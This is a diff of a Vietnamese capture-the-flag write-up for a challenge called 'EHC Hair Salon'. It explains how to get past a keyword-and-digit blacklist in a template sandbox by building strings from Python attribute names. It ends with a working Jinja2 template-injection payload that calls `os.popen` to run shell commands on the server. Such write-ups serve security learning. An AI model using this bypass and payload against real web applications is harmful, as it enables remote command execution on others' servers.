@@ -1,5 +1,6 @@
 
 # Write-up EHC Hair Salon
+
 *Kiến thức nền:
 PyJail Escape,
 OOP in Python,
@@ -45,9 +46,9 @@ regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"
 
 Không thể tạo payload trực tiếp, ta sẽ đi đường vòng bằng cách sử dụng các attribute và method có sẵn của python. Ví dụ:
 
-* `().__doc__` sẽ trả về doc của tuple: `Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.`
-* `().__doc__[7]` sẽ trả về kí tự thứ 5 của string trên: `n`
-* `().__str__.__name__` sẽ trả về `__str__`
+* `().__str__` là một method-wrapper có sẵn của python để gọi hàm str() của tuple
+* `().__str__.__name__` sẽ trả về name của attribute: `__str__`
+* `().__str__.__name__[2]` sẽ trả về kí tự thứ 3 của chuỗi `__str__` là: `s`
 
 Vì tác giả đã filter số nên ta sử dụng hàm `[...].__len__()` để trả về số phần tử của 1 mảng. Ví dụ:
 
@@ -56,12 +57,12 @@ Vì tác giả đã filter số nên ta sử dụng hàm `[...].__len__()` để
 
 Kết hợp 2 cái ta sẽ có được:
 
-* `().__doc__[[[],[],[]].__len__()]` để trả về kí tự `l`
+* `().__le__.__name__[[[],[]].__len__()]` để trả về kí tự `l`
 * `().__str__.__name__[[[],[]].__len__()]` để trả về kí tự `s`
 
 Chúng ta thử inject payload bằng cách gọi [os.popen().read()](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread) để chạy lệnh `ls` trong shell
 
-* `{{cycler.__init__.__globals__.os.popen(().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}`  dùng dấu `+` để ghép chuỗi
+* `{{cycler.__init__.__globals__.os.popen(().__le__.__name__[[[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}`  dùng dấu `+` để ghép chuỗi
 
 Ta tìm được file tên là **flag** trong thư mục
 
